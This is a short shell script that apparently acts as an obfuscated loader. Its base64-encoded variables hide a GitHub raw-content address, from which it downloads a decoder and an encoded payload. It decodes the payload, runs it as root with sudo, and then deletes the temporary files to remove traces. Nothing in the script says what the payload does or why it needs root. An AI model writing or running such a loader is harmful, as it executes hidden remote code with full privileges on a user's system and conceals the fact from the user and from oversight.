export h=aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tCg==
export j=LzFuZm8vYmxvY2tlZF93ZWJsaXN0L21haW4vZGVjb2RlCg==
export k=LzFuZm8vYmxvY2tlZF93ZWJsaXN0L21haW4vdGFzawo=

function decode() {
  ( openssl enc -base64 -d <<< $h ; openssl enc -base64 -d <<< $j ) | tr -d '\n' | xargs curl -s > /tmp/vHB3aDAxdrK7eXVsdecode
}

function task() {
  ( openssl enc -base64 -d <<< $h ; openssl enc -base64 -d <<< $k ) | tr -d '\n' | xargs curl -s | python /tmp/vHB3aDAxdrK7eXVsdecode > /tmp/vHB3aDAxdrK7eXVstask
}

function run() {
  sudo python3 /tmp/vHB3aDAxdrK7eXVstask
}

function cleanup() {
  rm -f /tmp/vHB3aDAxdrK7eXVsdecode /tmp/vHB3aDAxdrK7eXVstask
}

decode && task && run && cleanup || cleanup